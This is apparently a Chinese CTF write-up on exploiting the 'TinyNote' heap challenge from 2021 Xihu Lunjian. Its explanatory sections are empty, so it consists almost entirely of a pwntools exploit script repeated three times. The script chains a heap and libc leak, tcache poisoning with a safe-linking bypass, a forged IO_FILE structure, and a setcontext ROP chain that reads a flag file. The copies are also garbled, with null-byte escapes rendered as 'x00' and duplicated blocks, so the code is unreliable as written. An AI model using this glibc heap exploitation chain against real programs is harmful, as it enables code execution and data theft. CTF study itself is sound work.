# 2021西湖论剑-TinyNote详细分析

> 原文: https://www.ctfiot.com/153753.html
> ID: 153753

一

前言

二

前置知识

mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];

三

TinyNote的脚本解析

add(0)
add(1)
delete(0)
show(0)
io.recvuntil(b'Content:')
heap_base = u64(io.recv(5).ljust(8, b'x00')) << 12

heap = heap_base + 0x2b0
xor = heap_base >> 12
delete(1)
edit(1, p64(xor ^ heap))
add(1)
add(0)
edit(0, p64(0) + p64(0x421))
for i in range(33):
 add(0)

delete(1)
show(1)
io.recvuntil(b'Content:')
libcbase = u64(io.recv(6).ljust(8, b'x00')) - (0x7f71d9fd2c00 - 0x7f71d9df2000)

add(0)
add(1)
delete(0)
delete(1)
heap = heap_base + 0x10
edit(1, p64(xor ^ heap))
add(0)
add(0)
#edit(0, p64(0))

add(1)
add(2)
delete(1)
edit(0, p64(2))
edit(1, p64(xor ^ heap_base + 0x90))
add(1)
add(1)
for i in range(7):
 edit(0, p64(0))
 add(2)
 edit(0, p64(i))
 delete(2)

edit(0, p64(0))
add(2)
edit(0, p64(7))
delete(2)
edit(2, p64(xor ^ (io_list_all + 0x70)))
for i in range(6):
 add(2)
 edit(0, p64(7))
 delete(2)
 edit(0, p64(6-i))

edit(0, p64(0))
#edit(1, p64(io_list_all >> 12))
add(2)

def change(addr,context):
 edit(0,p64(1))
 edit(1,p64(addr))
 add(2)
 edit(2,context)

length=0x230
start = heap_base + 0x600
end = start + ((length) - 100)//2
change(heap_base + 0x30,p64(1)+p64(0xffffffffffff))
change(heap_base + 0x40,p64(0)+p64(start))
change(heap_base + 0x50,p64(end))
change(heap_base + 0xc0,p64(0))
change(heap_base + 0xe0,p64(0)+p64(io_str_jumps))
change(heap_base + 0x1a0,p64(free_hook))
change(start,p64(pcop)+p64(heap_base + 0x700))
change(heap_base + 0x720,p64(setcontext+61))
change(heap_base + 0x7a0,p64(heap_base + 0x800)+p64(rdi_ret))
change(heap_base + 0x7c0,'flag'.ljust(0x10,'x00'))
change(heap_base + 0x800,p64(heap_base + 0x7c0)+p64(rsi_ret))
change(heap_base + 0x810,p64(0)+p64(open))
change(heap_base + 0x820,p64(rdi_ret)+p64(3))
change(heap_base + 0x830,p64(rsi_ret)+p64(heap_base + 0x900))
change(heap_base + 0x840,p64(rdx_ret)+p64(0x50))
change(heap_base + 0x850,p64(read)+p64(rdi_ret))
change(heap_base + 0x860,p64(1)+p64(write))

edit(1,p64(free_hook))
edit(0,p64(1))
add(2)

mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];

from pwn import *
io = process("./TinyNote")
libc = ELF("./libc-2.33.so")
def add(idx):
 io.recvuntil(b'Choice:')
 io.sendline(b'1')
 io.recvuntil(b'Index:')
 io.sendline(str(idx).encode())

def edit(idx, content):
 io.recvuntil(b'Choice:')
 io.sendline(b'2')
 io.recvuntil(b'Index:')
 io.sendline(str(idx).encode())
 io.recvuntil(b'Content:')
 io.send(content)

def show(idx):
 io.recvuntil(b'Choice:')
 io.sendline(b'3')
 io.recvuntil(b'Index:')
 io.sendline(str(idx).encode())

def delete(idx):
 io.recvuntil(b'Choice:')
 io.sendline(b'4')
 io.recvuntil(b'Index:')
 io.sendline(str(idx).encode())

add(0)
add(1)
delete(0)
show(0)
io.recvuntil(b'Content:')
heap_base = u64(io.recv(5).ljust(8, b'x00')) << 12

heap = heap_base + 0x2b0
xor = heap_base >> 12
delete(1)
edit(1, p64(xor ^ heap))
add(1)
add(0)
edit(0, p64(0) + p64(0x421))
for i in range(33):
 add(0)

delete(1)
show(1)
io.recvuntil(b'Content:')
libcbase = u64(io.recv(6).ljust(8, b'x00')) - (0x7f71d9fd2c00 - 0x7f71d9df2000)
io_list_all = libcbase + 0x1e15c0
io_str_jumps = libcbase + (0x7f6b247b0560 - 0x7f6b245ce000)
free_hook = libcbase + libc.sym['__free_hook']
pcop = libcbase + 0x14a0a0
setcontext = libcbase + libc.sym['setcontext']
rdi_ret = libcbase + 0x0000000000028a55
rsi_ret = libcbase + 0x000000000002a4cf
rdx_ret = libcbase + 0x00000000000c7f32
open = libcbase + libc.sym['open']
read = libcbase + libc.sym['read']
write = libcbase + libc.sym['write']

add(0)
add(1)
delete(0)
delete(1)
heap = heap_base + 0x10
edit(1, p64(xor ^ heap))
add(0)
add(0)
#edit(0, p64(0))

add(1)
add(2)
delete(1)
edit(0, p64(2))
edit(1, p64(xor ^ heap_base + 0x90))
add(1)
add(1)
for i in range(7):
 edit(0, p64(0))
 add(2)
 edit(0, p64(i))
 delete(2)

edit(0, p64(0))
add(2)
edit(0, p64(7))
delete(2)
edit(2, p64(xor ^ (io_list_all + 0x70)))
for i in range(6):
 add(2)
 edit(0, p64(7))
 delete(2)
 edit(0, p64(6-i))

edit(0, p64(0))
#edit(1, p64(io_list_all >> 12))
add(2)

def change(addr,context):
 edit(0,p64(1))
 edit(1,p64(addr))
 add(2)
 edit(2,context)

length=0x230
start = heap_base + 0x600
end = start + ((length) - 100)//2
change(heap_base + 0x30,p64(1)+p64(0xffffffffffff))
change(heap_base + 0x40,p64(0)+p64(start))
change(heap_base + 0x50,p64(end))
change(heap_base + 0xc0,p64(0))
change(heap_base + 0xe0,p64(0)+p64(io_str_jumps))
change(heap_base + 0x1a0,p64(free_hook))
change(start,p64(pcop)+p64(heap_base + 0x700))
change(heap_base + 0x720,p64(setcontext+61))
change(heap_base + 0x7a0,p64(heap_base + 0x800)+p64(rdi_ret))
change(heap_base + 0x7c0,'flag'.ljust(0x10,'x00'))
change(heap_base + 0x800,p64(heap_base + 0x7c0)+p64(rsi_ret))
change(heap_base + 0x810,p64(0)+p64(open))
change(heap_base + 0x820,p64(rdi_ret)+p64(3))
change(heap_base + 0x830,p64(rsi_ret)+p64(heap_base + 0x900))
change(heap_base + 0x840,p64(rdx_ret)+p64(0x50))
change(heap_base + 0x850,p64(read)+p64(rdi_ret))
change(heap_base + 0x860,p64(1)+p64(write))

edit(1,p64(free_hook))
edit(0,p64(1))
add(2)
io.interactive()

四

总结

看雪ID：a2ure

https://bbs.kanxue.com/user-home-991890.htm

*本文为看雪论坛精华文章，由 a2ure 原创，转载请注明来自看雪社区

# 往期推荐

1、区块链智能合约逆向-合约创建-调用执行流程分析

2、在Windows平台使用VS2022的MSVC编译LLVM16

3、神挡杀神——揭开世界第一手游保护nProtect的神秘面纱

4、为什么在ASLR机制下DLL文件在不同进程中加载的基址相同

5、2022QWB final RDP

6、华为杯研究生国赛 adv_lua

球分享

球点赞

球在看


```
一
前言
二
前置知识
mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
三
TinyNote的脚本解析
add(0)
add(1)
delete(0)
show(0)
io.recvuntil(b'Content:')
heap_base = u64(io.recv(5).ljust(8, b'x00')) << 12
heap = heap_base + 0x2b0
xor = heap_base >> 12
delete(1)
edit(1, p64(xor ^ heap))
add(1)
add(0)
edit(0, p64(0) + p64(0x421))
for i in range(33):
 add(0)

delete(1)
show(1)
io.recvuntil(b'Content:')
libcbase = u64(io.recv(6).ljust(8, b'x00')) - (0x7f71d9fd2c00 - 0x7f71d9df2000)
add(0)
add(1)
delete(0)
delete(1)
heap = heap_base + 0x10
edit(1, p64(xor ^ heap))
add(0)
add(0)
    #edit(0, p64(0))
add(1)
add(2)
delete(1)
edit(0, p64(2))
edit(1, p64(xor ^ heap_base + 0x90))
add(1)
add(1)
for i in range(7):
 edit(0, p64(0))
 add(2)
 edit(0, p64(i))
 delete(2)
edit(0, p64(0))
add(2)
edit(0, p64(7))
delete(2)
edit(2, p64(xor ^ (io_list_all + 0x70)))
for i in range(6):
 add(2)
 edit(0, p64(7))
 delete(2)
 edit(0, p64(6-i))

edit(0, p64(0))
    #edit(1, p64(io_list_all >> 12))
add(2)
def change(addr,context):
 edit(0,p64(1))
 edit(1,p64(addr))
 add(2)
 edit(2,context)

length=0x230
start = heap_base + 0x600
end = start + ((length) - 100)//2
change(heap_base + 0x30,p64(1)+p64(0xffffffffffff))
change(heap_base + 0x40,p64(0)+p64(start))
change(heap_base + 0x50,p64(end))
change(heap_base + 0xc0,p64(0))
change(heap_base + 0xe0,p64(0)+p64(io_str_jumps))
change(heap_base + 0x1a0,p64(free_hook))
change(start,p64(pcop)+p64(heap_base + 0x700))
change(heap_base + 0x720,p64(setcontext+61))
change(heap_base + 0x7a0,p64(heap_base + 0x800)+p64(rdi_ret))
change(heap_base + 0x7c0,'flag'.ljust(0x10,'x00'))
change(heap_base + 0x800,p64(heap_base + 0x7c0)+p64(rsi_ret))
change(heap_base + 0x810,p64(0)+p64(open))
change(heap_base + 0x820,p64(rdi_ret)+p64(3))
change(heap_base + 0x830,p64(rsi_ret)+p64(heap_base + 0x900))
change(heap_base + 0x840,p64(rdx_ret)+p64(0x50))
change(heap_base + 0x850,p64(read)+p64(rdi_ret))
change(heap_base + 0x860,p64(1)+p64(write))

edit(1,p64(free_hook))
edit(0,p64(1))
add(2)
mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
from pwn import *
io = process("./TinyNote")
libc = ELF("./libc-2.33.so")
def add(idx):
 io.recvuntil(b'Choice:')
 io.sendline(b'1')
 io.recvuntil(b'Index:')
 io.sendline(str(idx).encode())

def edit(idx, content):
 io.recvuntil(b'Choice:')
 io.sendline(b'2')
 io.recvuntil(b'Index:')
 io.sendline(str(idx).encode())
 io.recvuntil(b'Content:')
 io.send(content)

def show(idx):
 io.recvuntil(b'Choice:')
 io.sendline(b'3')
 io.recvuntil(b'Index:')
 io.sendline(str(idx).encode())

def delete(idx):
 io.recvuntil(b'Choice:')
 io.sendline(b'4')
 io.recvuntil(b'Index:')
 io.sendline(str(idx).encode())

add(0)
add(1)
delete(0)
show(0)
io.recvuntil(b'Content:')
heap_base = u64(io.recv(5).ljust(8, b'x00')) << 12

heap = heap_base + 0x2b0
xor = heap_base >> 12
delete(1)
edit(1, p64(xor ^ heap))
add(1)
add(0)
edit(0, p64(0) + p64(0x421))
for i in range(33):
 add(0)

delete(1)
show(1)
io.recvuntil(b'Content:')
libcbase = u64(io.recv(6).ljust(8, b'x00')) - (0x7f71d9fd2c00 - 0x7f71d9df2000)
io_list_all = libcbase + 0x1e15c0
io_str_jumps = libcbase + (0x7f6b247b0560 - 0x7f6b245ce000)
free_hook = libcbase + libc.sym['__free_hook']
pcop = libcbase + 0x14a0a0
setcontext = libcbase + libc.sym['setcontext']
rdi_ret = libcbase + 0x0000000000028a55
rsi_ret = libcbase + 0x000000000002a4cf
rdx_ret = libcbase + 0x00000000000c7f32
open = libcbase + libc.sym['open']
read = libcbase + libc.sym['read']
write = libcbase + libc.sym['write']

add(0)
add(1)
delete(0)
delete(1)
heap = heap_base + 0x10
edit(1, p64(xor ^ heap))
add(0)
add(0)
    #edit(0, p64(0))

add(1)
add(2)
delete(1)
edit(0, p64(2))
edit(1, p64(xor ^ heap_base + 0x90))
add(1)
add(1)
for i in range(7):
 edit(0, p64(0))
 add(2)
 edit(0, p64(i))
 delete(2)

edit(0, p64(0))
add(2)
edit(0, p64(7))
delete(2)
edit(2, p64(xor ^ (io_list_all + 0x70)))
for i in range(6):
 add(2)
 edit(0, p64(7))
 delete(2)
 edit(0, p64(6-i))

edit(0, p64(0))
    #edit(1, p64(io_list_all >> 12))
add(2)

def change(addr,context):
 edit(0,p64(1))
 edit(1,p64(addr))
 add(2)
 edit(2,context)

length=0x230
start = heap_base + 0x600
end = start + ((length) - 100)//2
change(heap_base + 0x30,p64(1)+p64(0xffffffffffff))
change(heap_base + 0x40,p64(0)+p64(start))
change(heap_base + 0x50,p64(end))
change(heap_base + 0xc0,p64(0))
change(heap_base + 0xe0,p64(0)+p64(io_str_jumps))
change(heap_base + 0x1a0,p64(free_hook))
change(start,p64(pcop)+p64(heap_base + 0x700))
change(heap_base + 0x720,p64(setcontext+61))
change(heap_base + 0x7a0,p64(heap_base + 0x800)+p64(rdi_ret))
change(heap_base + 0x7c0,'flag'.ljust(0x10,'x00'))
change(heap_base + 0x800,p64(heap_base + 0x7c0)+p64(rsi_ret))
change(heap_base + 0x810,p64(0)+p64(open))
change(heap_base + 0x820,p64(rdi_ret)+p64(3))
change(heap_base + 0x830,p64(rsi_ret)+p64(heap_base + 0x900))
change(heap_base + 0x840,p64(rdx_ret)+p64(0x50))
change(heap_base + 0x850,p64(read)+p64(rdi_ret))
change(heap_base + 0x860,p64(1)+p64(write))

edit(1,p64(free_hook))
edit(0,p64(1))
add(2)
io.interactive()
四
总结
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/3-1703815576.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/0-1703815577.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/3-1703815577.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/4-1703815577.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/5-1703815578.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1703815578.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/9-1703815578.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/6-1703815579.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/3-1703815579.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/0-1703815579.png)